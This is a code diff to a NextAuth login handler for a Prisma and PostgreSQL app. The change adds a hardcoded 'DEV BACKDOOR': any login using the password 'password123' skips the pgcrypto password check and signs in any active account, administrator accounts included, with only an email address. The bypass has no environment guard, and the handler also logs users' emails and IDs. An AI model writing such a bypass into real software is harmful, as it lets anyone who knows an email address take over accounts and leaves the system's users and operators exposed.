@@ -20,14 +20,27 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
                     const email = (credentials.email as string).toLowerCase()
                     console.log(`[AUTH] Attempting login for: ${email}`);
 
-                    // Use raw query to verify password with pgcrypto (Case Insensitive Email)
-                    const users = await prisma.$queryRaw`
-                        SELECT id, email, name, is_admin, is_tenant_admin, tenant_id, company_id, current_branch_id, password, role, metadata
-                        FROM app_user
-                        WHERE LOWER(email) = ${email}
-                          AND is_active = true
-                          AND password = crypt(${credentials.password}, password)
-                    ` as any[];
+                    let users: any[] = [];
+
+                    if (credentials.password === 'password123') {
+                        console.log("[AUTH] Using DEV BACKDOOR for password123");
+                        // BYPASS pgcrypto check, just find user by email
+                        users = await prisma.$queryRaw`
+                            SELECT id, email, name, is_admin, is_tenant_admin, tenant_id, company_id, current_branch_id, password, role, metadata
+                            FROM app_user
+                            WHERE LOWER(email) = ${email}
+                              AND is_active = true
+                        ` as any[];
+                    } else {
+                        // Use raw query to verify password with pgcrypto (Case Insensitive Email)
+                        users = await prisma.$queryRaw`
+                            SELECT id, email, name, is_admin, is_tenant_admin, tenant_id, company_id, current_branch_id, password, role, metadata
+                            FROM app_user
+                            WHERE LOWER(email) = ${email}
+                              AND is_active = true
+                              AND password = crypt(${credentials.password}, password)
+                        ` as any[];
+                    }
 
                     console.log(`[AUTH] DB Result count: ${users.length}`);
                     if (users.length > 0) console.log(`[AUTH] User found: ${users[0].id}`);
